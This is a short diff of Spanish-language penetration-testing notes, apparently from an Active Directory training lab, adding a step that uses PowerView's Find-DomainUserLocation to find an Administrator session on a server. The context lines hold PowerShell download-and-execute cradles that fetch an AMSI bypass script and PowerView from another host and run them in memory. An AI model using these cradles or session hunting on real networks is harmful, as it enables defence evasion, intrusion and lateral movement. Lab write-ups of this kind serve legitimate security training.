@@ -82,3 +82,9 @@ iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/Amsi-
 iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/PowerView.ps1')
 ```
 
+Ahora enumeraremos a todos aquellos usuarios logados en el dominio y tienen sesiones activas viendo en que maquina esta cada uno
+```shell
+Find-DomainUserLocation
+```
+
+viendo que hay una sesion de *Administrator* en el servidor *dcorp-mgmt*
